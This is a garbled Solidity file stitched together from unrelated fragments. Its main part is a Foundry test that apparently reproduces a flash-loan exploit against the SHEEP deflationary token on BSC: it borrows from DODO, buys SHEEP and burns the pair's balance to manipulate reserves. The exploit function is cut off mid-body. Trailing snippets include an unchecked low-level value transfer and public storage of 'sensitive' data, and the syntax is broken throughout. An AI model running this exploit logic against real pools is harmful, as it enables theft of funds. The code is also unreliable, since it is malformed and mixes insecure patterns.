
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface RDeflationERC20 is IERC20 {
    function burn(uint256 amount) external};
contract ContractTest is Test {
    RDeflationERC20 SHEEP = RDeflationERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 25_543_755)};
    function testExploit() public {
        uint256 amount = SHEEP.balanceOf(address(this));
        if (amount > 0) {
            uint256 burnAmount = amount / 2;
            SHEEP.burn(burnAmount)};
        DVM(dodo).flashLoan(380 * 1e18, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18)};
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNBToSHEEP();
        while (SHEEP.balanceOf(address(Pair)) > 2) {
            uint256 burnAmount = SHEEP.balanceOf(address(this));
            SHEEP.burn(burnAmount)};
        Pair.sync();
function reuseDetection(bytes32 key) public {
    require(!used[key]);
    used[key] = true}
function loglessTransfer(address to, uint256 amount) public {
    to.call{value: amount}("")}
string public sensitiveData;
function storeData(string memory d) public {
    sensitiveData = d}